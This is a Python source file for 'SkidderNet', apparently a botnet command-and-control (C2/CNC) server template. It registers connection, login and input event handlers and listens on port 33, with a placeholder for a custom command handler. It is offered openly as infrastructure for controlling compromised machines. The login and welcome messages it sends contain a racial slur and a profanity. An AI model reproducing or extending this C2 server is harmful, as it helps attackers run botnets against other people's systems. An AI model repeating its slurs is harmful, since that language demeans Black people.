"""
    [ A C2/CNC Designed To Work Like a Discord Bot with Events :) ]

    Socket Protection can be added to 'on_incoming_connection(client)'
"""
from skidder import *

# Handle Incoming Connections
def on_incoming_connection(client):
    client.send("Welcome to the SkidderNet BITCH!\r\n".encode())

# Handle Successful Login
def on_success_login(client, user: User):
    client.send(f"Successfully logged in nigga...! {user.name}".encode())

# Handle Failed Login Attempts
def on_failed_login(client):
    client.send(f"Failed to login nigga...!".encode())

# Handle Connection Disconnects
def on_connection_disconnect(client):
    pass

# Grab all inputs from socket (Including commands)
def on_input(client, user, data):
    print(f"New Input {user.name} {data}")

    # You can create your own command handler here

try:
    # Start SkidderNet
    net = SkidderNet(33)

    # Link Your Own Handlers
    net.LoadIncomingReqEvent(on_incoming_connection)
    net.LoadLoginEvent(on_success_login, on_failed_login)

    # net.LoadDisconnectEventHandler(on_connection_disconnect) # (UNFINISHED)
    net.LoadInputEvent(on_input) # Optional


    # Listen for connections
    net.ConnectionListener()
except KeyboardInterrupt:
    exit(0)